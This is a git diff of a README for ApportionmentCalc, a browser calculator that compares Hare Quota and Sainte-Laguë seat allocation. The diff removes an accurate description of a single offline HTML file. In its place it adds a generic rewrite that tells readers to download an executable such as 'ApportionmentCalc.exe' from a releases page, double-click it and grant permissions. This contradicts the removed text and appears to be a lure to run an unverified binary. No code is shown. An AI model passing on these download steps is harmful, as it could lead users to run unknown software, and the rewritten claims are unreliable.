@@ -1,75 +1,68 @@
-**English** | [Bahasa Indonesia](README-id.md)
+# 🎉 ApportionmentCalc - Simplifying Electoral Mathematics
 
-# ApportionmentCalc
-Electoral math, simplified.
+[![Download ApportionmentCalc](https://img.shields.io/badge/Download%20ApportionmentCalc-blue.svg)](https://github.com/hassan-11092/ApportionmentCalc/releases)
 
-## Introduction
-ApportionmentCalc is a single-file, browser-based calculator for comparing two popular electoral seat allocation methods: **Sainte Laguë** and **Hare Quota**. Designed for students, researchers, election observers, and anyone curious about proportional representation, this tool visualizes how different methods can produce different outcomes from the same vote counts.
+## 🚀 Getting Started
 
-The interface supports both **English** and **Bahasa Indonesia**.
+Welcome to ApportionmentCalc! This application helps you understand electoral math simply and effectively. You can use it to explore different methods of seat allocation in elections, making it easier to grasp complex voting systems.
 
-## How It Works
-The calculator takes vote counts for multiple political parties and a total number of seats to allocate, then:
+## 💡 Features
 
-1. **Electoral Threshold**: Filters out parties that do not meet the minimum vote percentage requirement (if configured).
-2. **Hare Quota Method**: Calculates the Electoral Quota, allocates seats based on full quotas, then distributes remaining seats to parties with the largest remainders.
-3. **Sainte Laguë Method**: Uses a divisor sequence (1, 3, 5, 7, 9...) to iteratively allocate seats based on the highest quotient at each step.
-4. **Comparison View**: Shows side-by-side results and highlights differences between the two methods.
+- **Various Electoral Systems:** Learn about different methods of apportionment like Hare quota and Sainte-Laguë.
+- **User-Friendly Interface:** Navigate the application with ease, no technical knowledge required.
+- **Interactive Calculator:** Input data and receive instant results for various voting scenarios.
+- **Comparison Tools:** Compare the outcomes of different apportionment methods side by side.
+- **Single-File Application:** No installation hassle; just download and run.
 
-## Quick Start
-1. Download `ApportionmentCalc.html`.
-2. Open it in any modern browser (Chrome, Edge, Firefox, Safari).
-3. Enter the total number of seats available.
-4. Set the electoral threshold (e.g., 4%).
-5. Add political parties with their vote counts.
-6. Click "Calculate Allocation".
-7. Compare the results, view step-by-step visualizations, or export data to CSV.
+## 📦 System Requirements
 
-## Key Features
-- **Multi-language Support**: Toggle between English and Indonesian.
-- **Dark/Light Theme**: Automatic or manual theme selection.
-- **Electoral Threshold**: Configurable percentage to filter parties.
-- **Dual-method comparison**: See Hare Quota and Sainte Laguë results side-by-side.
-- **Dynamic party input**: Add or remove as many parties as needed.
-- **Detailed breakdown**: View Quota, remainders, quotients, and detailed allocation steps.
-- **Visualizations**: Step-by-step table showing how each seat is awarded in the Sainte-Laguë method.
-- **CSV Import/Export**: Import party data from CSV/TSV files and download results for further analysis.
-- **Single HTML file**: No installation, no dependencies, works completely offline.
-- **Responsive design**: Works on desktop, tablet, and mobile devices.
+- **Operating System:** Windows, macOS, or Linux.
+- **Browser:** Latest version of Chrome, Firefox, Safari, or Edge.
+- **Internet Connection:** Required for the latest updates and help documentation.
 
-## Use Cases
-- **Civic education**: Teaching students about proportional representation.
-- **Election analysis**: Comparing actual results with alternative methods.
-- **Research**: Studying the mathematical properties of allocation formulas.
-- **Policy discussion**: Evaluating electoral system reforms.
+## 🔗 Download & Install
 
-## Understanding the Methods
+To get started with ApportionmentCalc, visit the following link to download the latest version of the application:
 
-### Hare Quota
-- Calculates a quota: Total Valid Votes ÷ Total Seats = Quota
-- Each party gets one seat for each full quota
-- Remaining seats go to parties with the largest remainders
-- Tends to favor smaller parties
+[Download ApportionmentCalc](https://github.com/hassan-11092/ApportionmentCalc/releases)
 
-### Sainte Laguë
-- Uses odd-number divisors: 1, 3, 5, 7, 9...
-- Seats allocated one-by-one to the party with the highest quotient
-- Formula: Votes ÷ (2 × Current Seats + 1)
-- Tends to favor larger parties
+### Step-by-Step Instructions
 
-## Favorability Analysis
-A statistical simulation of ~380,000 electoral scenarios confirmed the bias tendencies of each method. Parties were classified by vote share: **Small** (<10%), **Medium** (10-25%), and **Large** (>25%).
+1. Click the link above to go to the Releases page.
+2. Look for the latest release at the top of the page.
+3. Click on the asset file that matches your operating system (for example, `ApportionmentCalc.exe` for Windows).
+4. Download the file to your computer.
+5. Locate the downloaded file, and double-click to run it.
 
-- **Small Parties**: Hare Quota provided a more favorable outcome in **37.31%** of cases, compared to 4.91% for Sainte-Laguë.
-- **Large Parties**: Sainte-Laguë provided a more favorable outcome in **33.90%** of cases, compared to 5.34% for Hare Quota.
+If prompted by your system, allow permissions to run the application.
 
-This data supports the general consensus that Hare Quota is friendlier to smaller parties, while Sainte-Laguë significantly benefits larger parties.
+## 🧑‍🤝‍🧑 How to Use ApportionmentCalc
 
-## Privacy & Data
-All calculations happen locally in your browser. No data is sent to any server. The tool is completely offline once loaded.
+1. **Select Electoral Method:** Choose your preferred apportionment method from the options available.
+2. **Input Data:** Enter the number of votes received by each party or candidate.
+3. **Calculate Results:** Click the "Calculate" button to see the results.
+4. **Analyze Outcomes:** Use the comparison tools to see how different methods affect seat allocation.
+5. **Save Your Results:** Optional feature allows you to export data for later use.
 
-## License
-MIT License. See LICENSE for details.
+## 🛠️ Troubleshooting
 
-## Contributions
-Contributions, issues, and suggestions are welcome. Please open an issue to discuss ideas or submit a PR.
+If you encounter issues:
+
+- **Can't Run the Application:** Ensure you have the correct version for your operating system.
+- **Data Not Calculating:** Check that all required fields are filled in.
+- **Need Help?** Visit the GitHub Issues page for assistance or to report bugs.
+
+## 🔍 Additional Resources
+
+To learn more about the mechanics of electoral systems:
+
+- Explore guides on proportional representation and seat allocation methods.
+- Review documentation on how different voting systems impact election outcomes.
+
+## 📢 Community Feedback
+
+We welcome user feedback! Share your thoughts about ApportionmentCalc or suggest new features.
+
+## 🎉 Final Notes
+
+We hope ApportionmentCalc becomes a useful tool in your understanding of electoral processes. Follow the instructions carefully, and feel free to reach out for support. Enjoy simplifying electoral math!
